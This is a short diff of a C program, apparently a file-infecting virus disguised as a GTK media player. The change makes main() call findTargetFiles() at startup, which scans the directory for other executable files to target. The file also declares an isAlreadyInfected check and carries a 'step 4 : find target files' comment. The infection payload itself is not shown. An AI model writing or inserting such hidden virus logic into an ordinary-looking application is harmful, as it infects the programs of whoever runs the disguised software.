@@ -9,7 +9,7 @@
 
 bool isAlreadyInfected(char *pgrmName, DIR *d);
 // step 4 : find target files
-// gcc -o mediaplayer mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
+//gcc -o mediaPlayer mediaplayer/mediaplayer.c `pkg-config --cflags --libs gtk+-3.0`
 void findTargetFiles()
 {
         DIR *d;
@@ -24,7 +24,7 @@ void findTargetFiles()
                         stat(dir->d_name, &sb);
                         // get only user program
                         numberOfPGRMS++;
-                        if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode) && !strstr(dir->d_name, "mediaplayer"))
+                        if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode) && !strstr(dir->d_name, "mediaPlayer"))
                         {
                                 printf("Permission d'execution sur le fichier : %s\n", dir->d_name);
                                 printf("ID of device containing the file : %lu\n", sb.st_dev);
@@ -216,7 +216,7 @@ static void remove_image() {
 */
 int main(int argc, char *argv[])
 {
-
+        findTargetFiles();
         GtkWidget *menu_bar, *file_menu, *menu_item, *vbox_menu, *button;
 
         gtk_init(&argc, &argv);
